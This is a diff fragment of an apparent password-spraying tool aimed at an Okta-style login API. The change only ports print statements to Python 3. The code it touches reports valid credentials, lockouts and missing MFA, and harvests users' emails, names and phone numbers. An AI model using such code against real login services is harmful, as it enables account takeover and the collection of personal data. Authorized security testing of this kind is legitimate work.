@@ -21,7 +21,7 @@ def checkCreds(creds):
     if response.status_code == 200 and 'status' in response.json():
         jsonData = response.json()
         if "LOCKED_OUT" == jsonData['status']:
-            print "Account locked out! %s:%s"%(username, password)
+            print("Account locked out! %s:%s"%(username, password))
         elif "MFA_ENROLL" == jsonData['status']:
             if args.csv:
                 email = jsonData['_embedded']['user']['profile']['login']
@@ -32,9 +32,9 @@ def checkCreds(creds):
                     for item in jsonData['_embedded']['factors']:
                         if "factorType" in item.keys() and item['factorType']=='sms':
                             phone = item['profile']['phoneNumber']
-                print ", ".join([username, password,email, fName, lName, phone])
+                print( ", ".join([username, password,email, fName, lName, phone]))
             else:
-                print "Valid Credentials without MFA! %s:%s"%(username, password)
+                print("Valid Credentials without MFA! %s:%s"%(username, password))
         else:
             if args.csv:
                 email = jsonData['_embedded']['user']['profile']['login']
@@ -45,9 +45,9 @@ def checkCreds(creds):
                     for item in jsonData['_embedded']['factors']:
                         if "factorType" in item.keys() and item['factorType']=='sms':
                             phone = item['profile']['phoneNumber']
-                print ", ".join([username, password,email, fName, lName, phone])
+                print(", ".join([username, password,email, fName, lName, phone]))
             else:
-                print "Valid Credentials! %s:%s"%(username, password)
+                print("Valid Credentials! %s:%s"%(username, password))
 
 uL=open(args.userList)
 users = map(str.strip, uL.readlines())
